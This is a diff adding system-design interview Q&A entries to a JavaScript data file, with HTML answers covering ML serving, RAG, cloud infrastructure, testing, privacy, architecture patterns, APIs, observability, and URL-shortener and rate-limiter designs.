+a:`<p>A feature store manages ML features consistently for training and online inference.</p>
+<table class="comp-table">
+<tr><th>Problem</th><th>Feature store solution</th></tr>
+<tr><td>Training uses one calculation, serving uses another</td><td>Shared feature definitions</td></tr>
+<tr><td>Online inference needs low latency</td><td>Online store like Redis/DynamoDB</td></tr>
+<tr><td>Training needs historical snapshots</td><td>Offline store like warehouse/lake</td></tr>
+</table>
+<pre>// Example feature
+user_7d_purchase_count
+Offline: computed from historical orders for model training
+Online: updated continuously for real-time recommendations</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Training-serving skew</strong> happens when the model sees different feature logic in production than it saw during training. Feature stores reduce that risk.</div></div>`},
+
+{id:'ai',section:'AI/ML Systems',icon:'🤖',level:'advanced',
+q:'How do you design an ML inference service?',
+a:`<p>An inference service hosts a trained model and returns predictions with predictable latency and reliability.</p>
+<div class="arch-box">
+  <div class="arch-title">Inference Service</div>
+  <div class="arch-row"><span class="arch-node primary">API</span><span class="arch-arrow">→</span><span class="arch-node warn">Feature Fetch</span><span class="arch-arrow">→</span><span class="arch-node info">Model Server</span><span class="arch-arrow">→</span><span class="arch-node success">Prediction</span></div>
+</div>
+<p><strong>Design decisions:</strong></p>
+<ul>
+<li><strong>Online inference</strong> — low latency, per request, more expensive.</li>
+<li><strong>Batch inference</strong> — precompute predictions, cheaper, may be stale.</li>
+<li><strong>Model versioning</strong> — route traffic to v1/v2 for A/B tests and rollback.</li>
+<li><strong>Fallbacks</strong> — if model fails, return popular/default results.</li>
+</ul>
+<pre>// Latency budget
+Feature fetch: 20ms
+Model inference: 40ms
+Post-processing: 10ms
+Total p95 target: &lt;100ms</pre>`},
+
+{id:'ai',section:'AI/ML Systems',icon:'🤖',level:'advanced',
+q:'How do you design a RAG system for question answering?',
+a:`<p>RAG (Retrieval-Augmented Generation) answers questions by retrieving relevant documents and passing them to an LLM as context.</p>
+<div class="arch-box">
+  <div class="arch-title">RAG Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Documents</span><span class="arch-arrow">→</span><span class="arch-node warn">Chunk + Embed</span><span class="arch-arrow">→</span><span class="arch-node info">Vector DB</span><span class="arch-arrow">→</span><span class="arch-node success">LLM Answer</span></div>
+</div>
+<pre>// Query path
+User asks question
+Embed question
+Retrieve top 5 relevant chunks
+Rerank chunks
+Send question + chunks to model
+Return answer with citations</pre>
+<p><strong>Production concerns:</strong> document permissions, freshness, chunk size, reranking, hallucination control, citation display, evaluation set, prompt injection defense, and latency/cost limits.</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Good design:</strong> Filter by user permissions before retrieval or during retrieval. Never retrieve private documents and hope the model ignores them.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// CLOUD INFRASTRUCTURE
+// ══════════════════════════════════════════════════════════════════
+{id:'cloud',section:'Cloud Infrastructure',icon:'☁️',level:'basic',
+q:'What is the difference between IaaS, PaaS, serverless, and containers?',
+a:`<p>These are different levels of abstraction for running software.</p>
+<table class="comp-table">
+<tr><th>Model</th><th>You manage</th><th>Provider manages</th><th>Example</th></tr>
+<tr><td>IaaS</td><td>VM, OS, runtime, app</td><td>Physical hardware</td><td>EC2, Compute Engine</td></tr>
+<tr><td>PaaS</td><td>App code and config</td><td>OS, runtime, scaling</td><td>Heroku, App Engine</td></tr>
+<tr><td>Containers</td><td>Image, app, dependencies</td><td>Cluster primitives if managed</td><td>Kubernetes, ECS</td></tr>
+<tr><td>Serverless</td><td>Function code</td><td>Servers, scaling, runtime</td><td>Lambda, Cloud Functions</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview default:</strong> Use managed services when they meet requirements. You get reliability, backups, upgrades, and scaling without building an operations team first.</div></div>`},
+
+{id:'cloud',section:'Cloud Infrastructure',icon:'☁️',level:'intermediate',
+q:'How do VPCs, subnets, security groups, and NAT gateways fit together?',
+a:`<p>A VPC is your private network in the cloud. Subnets divide it into zones, route tables decide where traffic goes, and security groups act like instance-level firewalls.</p>
+<div class="arch-box">
+  <div class="arch-title">Typical VPC Layout</div>
+  <div class="arch-row"><span class="arch-node primary">Internet</span><span class="arch-arrow">→</span><span class="arch-node warn">Load Balancer in Public Subnet</span><span class="arch-arrow">→</span><span class="arch-node info">App Pods in Private Subnet</span><span class="arch-arrow">→</span><span class="arch-node success">DB in Private Subnet</span></div>
+</div>
+<ul>
+<li><strong>Public subnet</strong> — has route to internet gateway; good for load balancers.</li>
+<li><strong>Private subnet</strong> — no direct inbound internet; good for apps and databases.</li>
+<li><strong>NAT gateway</strong> — private instances use it for outbound internet updates/API calls.</li>
+<li><strong>Security groups</strong> — allow only required ports, such as LB → app on 443 and app → DB on 5432.</li>
+</ul>`},
+
+{id:'cloud',section:'Cloud Infrastructure',icon:'☁️',level:'intermediate',
+q:'What is autoscaling and what metrics should drive it?',
+a:`<p>Autoscaling adds or removes capacity based on demand. The metric must match the bottleneck.</p>
+<table class="comp-table">
+<tr><th>System</th><th>Good scaling metric</th><th>Why</th></tr>
+<tr><td>Web API</td><td>CPU, RPS per pod, p95 latency</td><td>Tracks request pressure</td></tr>
+<tr><td>Queue workers</td><td>Queue age or consumer lag</td><td>Tracks delayed work</td></tr>
+<tr><td>WebSocket gateways</td><td>Open connections per node</td><td>Tracks connection capacity</td></tr>
+<tr><td>ML inference</td><td>GPU utilization, request latency</td><td>Tracks model-serving pressure</td></tr>
+</table>
+<pre>// Queue worker autoscaling
+if oldestMessageAge > 2 minutes:
+  add workers
+if oldestMessageAge < 10 seconds for 15 minutes:
+  remove workers</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Scaling lag:</strong> New servers take time to boot and warm caches. For predictable traffic spikes, scheduled scaling is often better than purely reactive scaling.</div></div>`},
+
+{id:'cloud',section:'Cloud Infrastructure',icon:'☁️',level:'advanced',
+q:'How do you design for cost efficiency without hurting reliability?',
+a:`<p>Cost design is part of system design. The goal is to remove waste while preserving SLOs.</p>
+<ul>
+<li><strong>Right-size compute</strong> — match CPU/memory requests to real usage.</li>
+<li><strong>Use lifecycle policies</strong> — move old logs/media to cheaper storage tiers.</li>
+<li><strong>Cache expensive calls</strong> — reduce DB, API, and model inference costs.</li>
+<li><strong>Use spot/preemptible nodes</strong> — good for batch jobs, not critical databases.</li>
+<li><strong>Control cardinality</strong> — unbounded metrics labels can explode observability bills.</li>
+</ul>
+<pre>// Example storage lifecycle
+Day 0-30: hot object storage
+Day 31-180: infrequent access
+Day 181+: archive tier
+Delete debug logs after 14 days unless compliance needs longer</pre>`},
+
+// ══════════════════════════════════════════════════════════════════
+// TESTING & CHAOS ENGINEERING
+// ══════════════════════════════════════════════════════════════════
+{id:'testing',section:'Testing & Chaos Engineering',icon:'🧪',level:'basic',
+q:'What tests matter for distributed systems?',
+a:`<p>Distributed systems need more than unit tests because many bugs appear at service boundaries.</p>
+<ul>
+<li><strong>Unit tests</strong> — pure business logic.</li>
+<li><strong>Integration tests</strong> — database, cache, queue, external APIs.</li>
+<li><strong>Contract tests</strong> — service A and service B agree on API shape.</li>
+<li><strong>End-to-end tests</strong> — critical user workflows like checkout.</li>
+<li><strong>Load tests</strong> — verify throughput, latency, and saturation behavior.</li>
+</ul>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview answer:</strong> Test contracts and failure modes. Most production incidents are not simple function bugs; they are timeouts, retries, schema drift, dependency failures, and partial writes.</div></div>`},
+
+{id:'testing',section:'Testing & Chaos Engineering',icon:'🧪',level:'intermediate',
+q:'How do load testing, stress testing, and soak testing differ?',
+a:`<table class="comp-table">
+<tr><th>Test</th><th>Goal</th><th>Example</th></tr>
+<tr><td>Load test</td><td>Validate expected traffic</td><td>5k RPS for 30 minutes</td></tr>
+<tr><td>Stress test</td><td>Find breaking point</td><td>Increase traffic until p95 or errors fail</td></tr>
+<tr><td>Soak test</td><td>Find slow leaks</td><td>Normal traffic for 24-72 hours</td></tr>
+<tr><td>Spike test</td><td>Test sudden bursts</td><td>500 RPS to 10k RPS in 1 minute</td></tr>
+</table>
+<pre>// What to measure during a load test
+RPS, p50/p95/p99 latency
+error rate
+CPU/memory
+DB QPS and slow queries
+queue lag
+cache hit rate</pre>`},
+
+{id:'testing',section:'Testing & Chaos Engineering',icon:'🧪',level:'advanced',
+q:'What is chaos engineering and how do you use it safely?',
+a:`<p>Chaos engineering intentionally injects controlled failures to prove the system can survive them.</p>
+<pre>// Safe chaos experiment
+Hypothesis:
+  If one app pod dies, load balancer removes it and users see no errors.
+
+Experiment:
+  Kill one pod during low traffic.
+
+Abort conditions:
+  error rate > 1%
+  p95 latency > 1s
+
+Expected:
+  Kubernetes restarts pod, traffic continues.</pre>
+<p><strong>Failure injections:</strong> kill instances, add latency, drop packets, fill disk, throttle CPU, pause queue consumers, expire certificates in staging.</p>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Start small:</strong> Chaos is not random destruction. Define blast radius, monitoring, rollback, and abort conditions before running experiments.</div></div>`},
+
+{id:'testing',section:'Testing & Chaos Engineering',icon:'🧪',level:'advanced',
+q:'How do you test disaster recovery and backups?',
+a:`<p>Backups are only useful if restore works within the required RTO and RPO.</p>
+<ul>
+<li>Run scheduled restore drills into an isolated environment.</li>
+<li>Verify data integrity and application compatibility after restore.</li>
+<li>Measure restore time, not just backup completion.</li>
+<li>Test regional failover with DNS/load balancer changes.</li>
+<li>Document the runbook and automate as much as possible.</li>
+</ul>
+<pre>// Restore drill checklist
+1. Restore latest production snapshot to staging
+2. Replay WAL/binlog until target time
+3. Run consistency checks
+4. Point app staging at restored DB
+5. Record actual RTO and data loss window</pre>`},
+
+// ══════════════════════════════════════════════════════════════════
+// PRIVACY & COMPLIANCE
+// ══════════════════════════════════════════════════════════════════
+{id:'compliance',section:'Privacy & Compliance',icon:'⚖️',level:'intermediate',
+q:'How do you design for PII protection?',
+a:`<p>PII is personally identifiable information: email, phone, address, government ID, precise location, and sometimes IP/device identifiers.</p>
+<ul>
+<li><strong>Data minimization</strong> — collect only what you need.</li>
+<li><strong>Encryption</strong> — TLS in transit, KMS-managed encryption at rest.</li>
+<li><strong>Access control</strong> — least privilege for services and employees.</li>
+<li><strong>Tokenization</strong> — replace sensitive values with tokens where possible.</li>
+<li><strong>Audit logs</strong> — record who accessed sensitive data and why.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Logging rule:</strong> Never log passwords, auth tokens, full payment card numbers, or raw government IDs. Logs spread everywhere and are hard to delete.</div></div>`},
+
+{id:'compliance',section:'Privacy & Compliance',icon:'⚖️',level:'intermediate',
+q:'What is data retention and deletion design?',
+a:`<p>Retention policies define how long data is kept. Deletion design defines how user data is removed from primary stores, caches, search indexes, warehouses, and backups.</p>
+<pre>// User deletion workflow
+User requests account deletion
+→ mark account deletion_pending
+→ enqueue deletion job
+→ delete/anonymize primary DB rows
+→ purge cache and search index
+→ tombstone userId for idempotency
+→ exclude from analytics or anonymize
+→ record deletion audit event</pre>
+<p><strong>Hard part:</strong> derived stores. If user email exists in Elasticsearch, data warehouse, notification provider, and logs, deletion must cover those too.</p>`},
+
+{id:'compliance',section:'Privacy & Compliance',icon:'⚖️',level:'advanced',
+q:'What are GDPR-style user rights engineers should know?',
+a:`<p>Privacy regulations vary by region, but many systems need to support these user rights:</p>
+<ul>
+<li><strong>Access</strong> — export my data.</li>
+<li><strong>Deletion</strong> — delete my account/data.</li>
+<li><strong>Correction</strong> — fix inaccurate data.</li>
+<li><strong>Portability</strong> — provide machine-readable export.</li>
+<li><strong>Consent withdrawal</strong> — stop processing for certain purposes.</li>
+</ul>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>System design angle:</strong> Keep a data inventory: which services store which fields, why they store them, retention period, and deletion/export strategy.</div></div>`},
+
+{id:'compliance',section:'Privacy & Compliance',icon:'⚖️',level:'advanced',
+q:'How do audit logs differ from application logs?',
+a:`<p>Application logs help debug systems. Audit logs provide a tamper-evident record of sensitive actions for security, compliance, and investigations.</p>
+<table class="comp-table">
+<tr><th></th><th>Application Log</th><th>Audit Log</th></tr>
+<tr><td>Purpose</td><td>Debugging</td><td>Accountability</td></tr>
+<tr><td>Example</td><td>DB query failed</td><td>Admin viewed user profile</td></tr>
+<tr><td>Retention</td><td>Shorter</td><td>Longer, policy-based</td></tr>
+<tr><td>Mutation</td><td>Can be rotated/deleted</td><td>Append-only, restricted access</td></tr>
+</table>
+<pre>// Audit event
+actor=user_admin_7
+action=VIEW_CUSTOMER_PII
+target=customer_42
+reason=ticket_123
+time=2026-05-11T10:30:00Z</pre>`},
+
+// ══════════════════════════════════════════════════════════════════
+// ARCHITECTURE PATTERNS
+// ══════════════════════════════════════════════════════════════════
+{id:'patterns',section:'Architecture Patterns',icon:'🧩',level:'intermediate',
+q:'What is Domain-Driven Design (DDD) and bounded context?',
+a:`<p>DDD organizes software around business domains. A bounded context is a boundary where terms and models have a specific meaning.</p>
+<pre>// Ecommerce bounded contexts
+Catalog:
+  Product means title, description, price, images
+
+Inventory:
+  Product means SKU, warehouse stock, reservation count
+
+Shipping:
+  Product means weight, dimensions, hazardous flag</pre>
+<p><strong>Why it matters:</strong> Microservices should map to stable domain boundaries, not random technical layers. Avoid one service per database table.</p>`},
+
+{id:'patterns',section:'Architecture Patterns',icon:'🧩',level:'intermediate',
+q:'What is hexagonal architecture?',
+a:`<p>Hexagonal architecture separates core business logic from external systems using ports and adapters.</p>
+<div class="arch-box">
+  <div class="arch-title">Ports and Adapters</div>
+  <div class="arch-row"><span class="arch-node primary">HTTP Controller</span><span class="arch-arrow">→</span><span class="arch-node warn">Application Use Case</span><span class="arch-arrow">→</span><span class="arch-node info">Repository Port</span><span class="arch-arrow">→</span><span class="arch-node success">PostgreSQL Adapter</span></div>
+</div>
+<p><strong>Benefit:</strong> business logic can be tested without databases, queues, or HTTP. You can swap adapters, such as PostgreSQL to DynamoDB, without rewriting domain logic.</p>`},
+
+{id:'patterns',section:'Architecture Patterns',icon:'🧩',level:'advanced',
+q:'What is the outbox pattern?',
+a:`<p>The outbox pattern reliably publishes events when a database transaction succeeds, avoiding the dual-write problem.</p>
+<pre>// Problem: dual write
+1. Write order to DB succeeds
+2. Publish order.created to Kafka fails
+Now other services never learn about the order.
+
+// Outbox pattern
+BEGIN
+  INSERT INTO orders ...
+  INSERT INTO outbox_events(type, payload) VALUES ('order.created', ...)
+COMMIT
+
+Background relay reads outbox_events and publishes to Kafka.</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Key idea:</strong> Store the business change and event in the same database transaction. Publishing can retry later safely.</div></div>`},
+
+{id:'patterns',section:'Architecture Patterns',icon:'🧩',level:'advanced',
+q:'What is strangler fig migration?',
+a:`<p>The strangler fig pattern incrementally replaces a legacy system by routing specific features to new services until the old system can be retired.</p>
+<div class="arch-box">
+  <div class="arch-title">Strangler Migration</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">Router / Gateway</span><span class="arch-arrow">→</span><span class="arch-node info">Legacy Monolith</span><span class="arch-arrow">+</span><span class="arch-node success">New Service</span></div>
+</div>
+<pre>// Migration path
+Phase 1: all traffic to monolith
+Phase 2: /search routes to new SearchService
+Phase 3: /checkout routes to new CheckoutService
+Phase 4: remaining monolith features retired</pre>
+<p><strong>Why use it:</strong> large rewrites are risky. Incremental migration gives rollback, learning, and business continuity.</p>`},
+
+// ══════════════════════════════════════════════════════════════════
+// API EVOLUTION & INTEGRATION
+// ══════════════════════════════════════════════════════════════════
+{id:'apievolution',section:'API Evolution & Integration',icon:'🔌',level:'intermediate',
+q:'How do you version APIs without breaking clients?',
+a:`<p>API versioning lets old clients keep working while new clients adopt changed behavior.</p>
+<table class="comp-table">
+<tr><th>Strategy</th><th>Example</th><th>Trade-off</th></tr>
+<tr><td>URL version</td><td>/v1/orders</td><td>Simple and visible</td></tr>
+<tr><td>Header version</td><td>Accept: application/vnd.app.v2+json</td><td>Cleaner URLs, harder to test manually</td></tr>
+<tr><td>Compatible evolution</td><td>Add optional fields only</td><td>Best when possible</td></tr>
+</table>
+<p><strong>Safe changes:</strong> add optional response fields, add optional request fields, add new endpoints. <strong>Breaking changes:</strong> rename fields, remove fields, change meaning, change required validation, or change status codes unexpectedly.</p>
+<pre>// Safer response evolution
+v1: { id, total }
+v2-compatible: { id, total, currency }  // old clients ignore currency</pre>`},
+
+{id:'apievolution',section:'API Evolution & Integration',icon:'🔌',level:'intermediate',
+q:'What is backward compatibility and forward compatibility?',
+a:`<p><strong>Backward compatibility</strong> means new servers still support old clients. <strong>Forward compatibility</strong> means old clients tolerate new data they do not understand.</p>
+<pre>// Forward-compatible client behavior
+Response:
+{
+  "id": 42,
+  "status": "SHIPPED",
+  "trackingUrl": "https://..."
+}
+
+Old client knows id/status and ignores trackingUrl.</pre>
+<p><strong>Practical rules:</strong></p>
+<ul>
+<li>Clients should ignore unknown fields.</li>
+<li>Servers should not require new fields immediately.</li>
+<li>Use feature flags for new behavior.</li>
+<li>Publish deprecation timelines before removing old APIs.</li>
+</ul>`},
+
+{id:'apievolution',section:'API Evolution & Integration',icon:'🔌',level:'advanced',
+q:'How do webhooks work and how do you make them reliable?',
+a:`<p>Webhooks are outbound HTTP callbacks sent when events happen. They are common for payments, GitHub events, shipping updates, and SaaS integrations.</p>
+<div class="arch-box">
+  <div class="arch-title">Webhook Delivery</div>
+  <div class="arch-row"><span class="arch-node primary">Event</span><span class="arch-arrow">→</span><span class="arch-node warn">Webhook Queue</span><span class="arch-arrow">→</span><span class="arch-node info">Delivery Worker</span><span class="arch-arrow">→</span><span class="arch-node success">Customer Endpoint</span></div>
+</div>
+<p><strong>Reliability design:</strong></p>
+<ul>
+<li>Sign payloads with HMAC so receivers verify authenticity.</li>
+<li>Use at-least-once delivery with retries and exponential backoff.</li>
+<li>Include eventId so receivers dedupe.</li>
+<li>Store delivery attempts and expose replay in dashboard.</li>
+<li>Disable endpoints after repeated failures and alert the owner.</li>
+</ul>
+<pre>// Webhook headers
+X-Event-Id: evt_123
+X-Signature: hmac_sha256(payload, shared_secret)
+X-Timestamp: 2026-05-11T10:30:00Z</pre>`},
+
+{id:'apievolution',section:'API Evolution & Integration',icon:'🔌',level:'advanced',
+q:'How do you design APIs for third-party developers?',
+a:`<p>Public APIs need stronger contracts, documentation, auth, rate limits, and lifecycle management than internal APIs.</p>
+<ul>
+<li><strong>Authentication</strong> — API keys or OAuth clients.</li>
+<li><strong>Authorization scopes</strong> — read:orders, write:orders, read:users.</li>
+<li><strong>Rate limits</strong> — per app, tenant, IP, and endpoint.</li>
+<li><strong>Developer experience</strong> — OpenAPI docs, examples, SDKs, sandbox, changelog.</li>
+<li><strong>Error model</strong> — stable error codes and helpful messages.</li>
+</ul>
+<pre>// Good error shape
+{
+  "error": {
+    "code": "rate_limit_exceeded",
+    "message": "Too many requests. Retry after 30 seconds.",
+    "requestId": "req_abc123"
+  }
+}</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Design tip:</strong> Treat public APIs like products. Breaking changes need migration guides, sunset dates, and communication.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// OBSERVABILITY & OPERATIONS
+// ══════════════════════════════════════════════════════════════════
+{id:'observability',section:'Observability & Ops',icon:'📊',level:'basic',
+q:'What is observability? How is it different from monitoring?',
+a:`<p><strong>Monitoring</strong> tells you whether known things are healthy. <strong>Observability</strong> helps you understand unknown problems by inspecting system output: metrics, logs, and traces.</p>
+<ul>
+<li><strong>Metrics</strong> — numeric time-series: CPU, memory, request rate, error rate, p95 latency.</li>
+<li><strong>Logs</strong> — structured event records: userId, orderId, status, error message, requestId.</li>
+<li><strong>Traces</strong> — request journey across services: API Gateway → UserService → DB → PaymentService.</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">Three Pillars</div>
+  <div class="arch-row"><span class="arch-node primary">Metrics: what changed?</span><span class="arch-arrow">→</span><span class="arch-node warn">Logs: what happened?</span><span class="arch-arrow">→</span><span class="arch-node info">Traces: where did it slow down?</span></div>
+</div>
+<pre>// Example incident: checkout latency is high
+Metric: p95 checkout latency jumped from 250ms to 2s
+Trace: PaymentService call takes 1.7s
+Log: payment_provider_timeout=true, provider=stripe, region=ap-south-1
+Action: fail over provider or degrade gracefully</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Design answer:</strong> Every production system should include dashboards, alerts, structured logs, request IDs, distributed tracing, and runbooks. Observability is part of the design, not an afterthought.</div></div>`},
+
+{id:'observability',section:'Observability & Ops',icon:'📊',level:'intermediate',
+q:'What are SLIs, SLOs, and SLAs? How do you alert correctly?',
+a:`<p>Reliability goals become useful when they are expressed as measurable user outcomes.</p>
+<ul>
+<li><strong>SLI</strong> — Service Level Indicator: a metric that represents user experience.</li>
+<li><strong>SLO</strong> — Service Level Objective: internal target for that metric.</li>
+<li><strong>SLA</strong> — Service Level Agreement: external contract with customer consequences.</li>
+</ul>
+<pre>// Example for a payments API
+SLI: percentage of POST /payments requests that complete under 500ms and return 2xx
+SLO: 99.9% of payment requests are successful and under 500ms per 30 days
+SLA: if monthly uptime drops below 99.5%, customer gets service credits</pre>
+<p><strong>Good alerts:</strong> page humans only when users are affected or the error budget is burning too fast. CPU at 90% is not automatically a page; 5xx rate at 8% for checkout probably is.</p>
+<table class="comp-table">
+<tr><th>Bad alert</th><th>Better alert</th><th>Why</th></tr>
+<tr><td>CPU &gt; 85%</td><td>p95 latency &gt; 1s for 10 min</td><td>User impact</td></tr>
+<tr><td>One request failed</td><td>Error rate &gt; 2% for 5 min</td><td>Avoid noise</td></tr>
+<tr><td>Queue has messages</td><td>Queue age &gt; 5 min</td><td>Backlog is only bad if stale</td></tr>
+</table>`},
+
+{id:'observability',section:'Observability & Ops',icon:'📊',level:'intermediate',
+q:'What deployment strategies reduce production risk?',
+a:`<p>Deployment strategy controls how new code reaches users and how quickly you can roll back.</p>
+<ul>
+<li><strong>Rolling deployment</strong> — replace servers gradually. Simple and common, but old and new versions run together.</li>
+<li><strong>Blue/Green</strong> — run two identical environments; switch traffic from blue to green. Fast rollback, higher cost.</li>
+<li><strong>Canary</strong> — send 1%, then 5%, then 25%, then 100% traffic to new version while watching metrics.</li>
+<li><strong>Feature flags</strong> — deploy code disabled, then enable per user/team/region without redeploying.</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">Canary Release</div>
+  <div class="arch-row"><span class="arch-node primary">Users</span><span class="arch-arrow">→</span><span class="arch-node warn">Load Balancer</span><span class="arch-arrow">→</span><span class="arch-node success">v1: 95%</span><span class="arch-arrow">+</span><span class="arch-node info">v2: 5%</span></div>
+</div>
+<pre>// Canary decision loop
+Deploy v2 to 5% traffic
+Watch: error rate, p95 latency, CPU, business metrics
+If healthy for 30 min → increase to 25%
+If unhealthy → route traffic back to v1 and investigate</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Database migrations:</strong> Make schema changes backward compatible. Add new nullable column → deploy code that writes both fields → backfill → read new field → remove old field later. Never deploy code that requires an irreversible schema change immediately.</div></div>`},
+
+{id:'observability',section:'Observability & Ops',icon:'📊',level:'intermediate',
+q:'What Kubernetes concepts matter in system design interviews?',
+a:`<p>Kubernetes is a container orchestration platform. In interviews, you usually do not need YAML depth; you need to explain how it keeps services running and discoverable.</p>
+<ul>
+<li><strong>Pod</strong> — smallest deployable unit; usually one app container plus optional sidecars.</li>
+<li><strong>Deployment</strong> — desired state for replicas; handles rolling updates and restarts.</li>
+<li><strong>Service</strong> — stable virtual IP/DNS name for a changing set of pods.</li>
+<li><strong>Ingress</strong> — HTTP routing from outside the cluster to services.</li>
+<li><strong>HPA</strong> — Horizontal Pod Autoscaler; adds/removes pods based on CPU, memory, or custom metrics.</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">Kubernetes Request Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">Ingress</span><span class="arch-arrow">→</span><span class="arch-node info">Service: checkout</span><span class="arch-arrow">→</span><span class="arch-node success">Pods x N</span></div>
+</div>
+<pre>// Autoscaling example
+Normal traffic: 4 checkout pods
+CPU &gt; 70% for 5 min → HPA scales to 10 pods
+Traffic drops → HPA scales down gradually
+
+// Important limit:
+HPA scales stateless app pods easily.
+Databases and queues need separate scaling plans.</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview answer:</strong> Kubernetes helps with scheduling, self-healing, rolling deployments, service discovery, and autoscaling. It does not magically solve bad database design, missing indexes, or cross-region consistency.</div></div>`},
+
+{id:'observability',section:'Observability & Ops',icon:'📊',level:'advanced',
+q:'How do you debug a slow distributed request in production?',
+a:`<p>Use a repeatable path: confirm user impact, narrow the slow segment, inspect recent changes, and mitigate before deep root-cause analysis.</p>
+<pre>// Example: GET /feed p95 went from 300ms to 3s
+1. Check dashboard:
+   request rate normal, error rate normal, p95 high
+
+2. Open a trace:
+   API Gateway: 20ms
+   FeedService: 80ms
+   UserService: 40ms
+   TimelineCache: 2500ms  ← bottleneck
+
+3. Check logs around requestId:
+   cache_timeout=true, redis_node=redis-07
+
+4. Mitigate:
+   remove redis-07 from cluster, fail over replica,
+   temporarily serve stale timeline if available
+
+5. Root cause later:
+   bad node, network saturation, hot key, or deploy issue?</pre>
+<p><strong>Useful signals:</strong> RED metrics for request services (Rate, Errors, Duration), USE metrics for resources (Utilization, Saturation, Errors), and queue age for async systems.</p>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Production habit:</strong> Put a correlation/request ID in every log line and propagate it through every service call. Without it, debugging distributed systems becomes guesswork.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// FULL SYSTEM DESIGNS
+// ══════════════════════════════════════════════════════════════════
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a URL shortener (like bit.ly)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a URL shortening service. Users submit long URLs and get a short 7-char code. Short URL redirects to original. 100M URLs stored, 10M new/day, 1B redirects/day.</div></div>
+<p><strong>1. Estimation</strong></p>
+<pre>Write: 10M/day = 116 writes/sec
+Read:  1B/day  = 11,600 reads/sec  ← read-heavy (100:1 ratio)
+Storage: 10M × 500bytes × 365days × 5yrs = ~9TB</pre>
+<p><strong>2. API Design</strong></p>
+<pre>POST /shorten  { longUrl }  → { shortUrl: "bit.ly/aB3kR9z" }
+GET  /{code}               → 301 Redirect to longUrl</pre>
+<p><strong>3. Short code generation</strong></p>
+<pre>Option A — Hash: MD5(longUrl) → take first 7 chars of Base62
+  "https://example.com/very-long-url"
+  → MD5 → "5d41402abc..." → take 7 → "5d41402" → "bit.ly/5d41402"
+  Problem: collisions. Fix with collision detection + retry.
+
+Option B — Auto-increment ID → Base62 encode
+  ID: 12345678 → Base62("12345678") → "VR6J"
+  Problem: sequential = guessable. Fix: shuffle with bijective function.</pre>
+<p><strong>4. Architecture</strong></p>
+<div class="arch-box">
+  <div class="arch-title">URL Shortener Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">API Gateway</span><span class="arch-arrow">→</span><span class="arch-node">Write Service</span><span class="arch-arrow">→</span><span class="arch-node info">PostgreSQL</span></div>
+  <div class="arch-divider"></div>
+  <div class="arch-row"><span class="arch-node primary">Client (GET /aB3)</span><span class="arch-arrow">→</span><span class="arch-node warn">CDN/LB</span><span class="arch-arrow">→</span><span class="arch-node">Redirect Service</span><span class="arch-arrow">→</span><span class="arch-node success">Redis Cache</span></div>
+  <div class="arch-row" style="margin-top:4px"><span class="arch-node success">Cache MISS</span><span class="arch-arrow">→</span><span class="arch-node info">PostgreSQL</span><span class="arch-arrow">→</span><span class="arch-node success">Update Cache</span><span class="arch-arrow">→</span><span class="arch-node primary">301 Redirect</span></div>
+</div>
+<p><strong>5. Scale decisions</strong></p>
+<ul>
+<li>11,600 reads/sec → Redis cache (hot URLs), read replicas</li>
+<li>301 (permanent) vs 302 (temporary): 301 cached by browser → less server load. 302 used if analytics needed per-click.</li>
+<li>Custom domains: store (domain, code) composite key</li>
+<li>Expiry: TTL field in DB + cron cleanup job</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a rate limiter',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a rate limiter that limits users to 100 API requests per minute. Must work across multiple app servers. Support per-user and per-IP limits. Return proper error when limit exceeded.</div></div>
+<p><strong>1. Where to implement</strong></p>
+<ul>
+<li><strong>Client-side</strong> — unreliable (client can bypass)</li>
+<li><strong>API Gateway</strong> — best for global rate limiting</li>
+<li><strong>Middleware in app</strong> — flexible but must use shared store</li>
+</ul>
+<p><strong>2. Algorithm: Sliding Window Counter with Redis</strong></p>
+<pre>function isAllowed(userId):
+  key = "rl:" + userId + ":" + floor(now/60)   // per-minute bucket
+  count = INCR key
+  if count == 1: EXPIRE key 120                // 2-min TTL safety
+  return count <= 100
+
+// Returns 429 Too Many Requests when count > 100
+// Headers: X-RateLimit-Limit: 100
+//          X-RateLimit-Remaining: 43
+//          X-RateLimit-Reset: 1684800060</pre>
+<p><strong>3. Architecture</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Distributed Rate Limiter</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">API Gateway</span><span class="arch-arrow">→</span><span class="arch-node success">Rate Limiter Middleware</span></div>
